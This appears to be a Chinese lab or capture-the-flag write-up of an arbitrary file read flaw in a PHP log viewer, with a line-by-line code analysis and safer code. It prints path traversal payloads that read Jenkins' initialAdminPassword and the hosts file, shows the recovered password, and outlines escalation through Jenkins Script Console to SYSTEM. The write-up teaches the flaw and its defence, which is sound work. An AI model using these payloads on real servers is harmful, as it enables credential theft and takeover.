# content-log.php 任意文件读取漏洞详解

## 一、源码逐行分析

先看完整的漏洞代码：

```php
<?php
$logfile = rawurldecode( $_GET['logfile'] );    // 第1行
// Make sure the file is exist.
if ( file_exists( $logfile ) ) {                 // 第2行
  // Get the content and echo it.
  $text = file_get_contents( $logfile );         // 第3行
  echo( $text );                                 // 第4行
}
exit;
```

### 第1行：`$logfile = rawurldecode( $_GET['logfile'] );`

| 步骤 | 说明 |
|------|------|
| `$_GET['logfile']` | 从URL参数中获取用户输入，例如 `?logfile=xxx` |
| `rawurldecode()` | URL解码，比如 `%2e%2e%2f` 解码为 `../` |
| 赋值给 `$logfile` | 将用户输入的路径存入变量 |

**关键问题：** 对用户输入**零过滤**，传入什么就是什么，没有做任何安全校验。

### 第2行：`if ( file_exists( $logfile ) )`

- `file_exists()` 检查文件是否存在
- 如果文件存在 → 进入代码块读取
- 如果文件不存在 → 静默退出（什么都没有输出）

### 第3行：`$text = file_get_contents( $logfile );`

- `file_get_contents()` 将整个文件读入一个字符串
- 把文件内容赋值给 `$text`

### 第4行：`echo( $text );`

- 输出文件内容到浏览器

## 二、漏洞核心：为什么攻击者能读到任意文件？

这个漏洞的本质是 **没有对用户输入的路径做任何限制**，底层原理是 PHP 文件系统函数（`file_exists`、`file_get_contents`）天然支持**相对路径**和**路径穿越**。

假设 Web 目录结构如下：

```
C:\xampp\htdocs\                    ← Web根目录
├── index.php
└── tools\
    └── content-log.php             ← 当前脚本位置
```

### 正常使用场景（开发者预期）

```
请求: /tools/content-log.php?logfile=access.log
实际路径: C:\xampp\htdocs\tools\access.log
                                   ↑ 当前目录下的文件
```

开发者本意是让用户读取 `tools/` 目录下的日志文件。

### 攻击者实际利用

```
请求: /tools/content-log.php?logfile=../../../../../../../../../ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword
```

## 三、路径穿越过程（图解）

用一张图说明 `../` 是如何逐级跳转到系统根目录的：

```
当前所在目录（脚本位置）:
  C:\xampp\htdocs\tools\

../    → C:\xampp\htdocs\            (跳1级，到htdocs)
../    → C:\xampp\                   (跳2级)
../    → C:\                         (跳3级，到C盘根目录)

然后正向进入目标路径:
ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword

最终完整路径:
  C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
```

> **技巧：** 实际攻击时我们用了很多 `../`（远超需要的3级），这是故意为之。因为攻击者不知道Web目录的具体深度，多写几个 `../` 确保一定能穿越到根目录——PHP 在根目录再执行 `../` 也不会报错，始终停在根目录。

## 四、和正常日志读取的对比

```php
// 开发者预期的调用
http://target/tools/content-log.php?logfile=2024-07-09.log
// → 读取 C:\xampp\htdocs\tools\2024-07-09.log

// 攻击者实际的调用
http://target/tools/content-log.php?logfile=../../../../../../../Windows/System32/drivers/etc/hosts
// → 读取 C:\Windows\System32\drivers\etc\hosts
```

两段参数 PHP 处理方式完全一样，区别仅在于参数内容。

## 五、为什么这个漏洞危害严重？

| 危害维度 | 说明 |
|----------|------|
| **信息泄露** | 可读取服务器上任何 PHP 进程有权访问的文件（配置文件、数据库密码、私钥等） |
| **凭据获取** | 本例中读取了 Jenkins 的 `initialAdminPassword`，直接拿下 Jenkins 管理员权限 |
| **源码审计** | 配合 `www.zip` 源码泄露，攻击者知道代码结构，可以精确定位更多敏感文件 |
| **连锁反应** | Jenkins管理员 → Script Console RCE → SYSTEM权限，一环扣一环 |

## 六、防御方法

安全的写法应该**限制读取路径**，例如：

```php
<?php
$logfile = $_GET['logfile'];

// 防御1：只允许读取特定目录下的文件
$base_dir = 'C:/xampp/htdocs/tools/logs/';
$file_path = $base_dir . basename($logfile);  // basename() 会剥离路径

// 防御2：过滤危险字符
if (strpos($logfile, '..') !== false) {
    die('Invalid path');
}

// 防御3：白名单验证
$allowed_files = ['access.log', 'error.log', 'debug.log'];
if (!in_array($logfile, $allowed_files)) {
    die('File not allowed');
}

if (file_exists($file_path)) {
    echo file_get_contents($file_path);
}
```

## 七、攻击流程图

```
攻击者
  │
  ├─ 1. fscan 发现 /www.zip ──→ 下载源码
  │
  ├─ 2. 审计源码 ──→ 发现 content-log.php 无过滤
  │
  ├─ 3. 构造 payload:
  │    ?logfile=../../../../../../../ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword
  │
  ├─ 4. PHP 逐级穿越路径:
  │    C:\xampp\htdocs\tools\
  │    → ../ → C:\xampp\htdocs\
  │    → ../ → C:\xampp\
  │    → ../ → C:\
  │    → ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
  │
  ├─ 5. file_get_contents() 读取 → 返回密码 510235cf43f14e83b88a9f144199655b
  │
  └─ 6. 登录 Jenkins → Script Console RCE → SYSTEM → flag01
```

## 八、一句话总结

`content-log.php` 把用户输入直接拼进 `file_get_contents()`，没有任何过滤。PHP 的文件函数天然支持 `../` 跨目录访问，攻击者利用这一点，从 Web 目录一路穿越到 C 盘根目录，再正向访问 `C:\ProgramData\Jenkins\...\initialAdminPassword`，读取到 Jenkins 管理员密码。
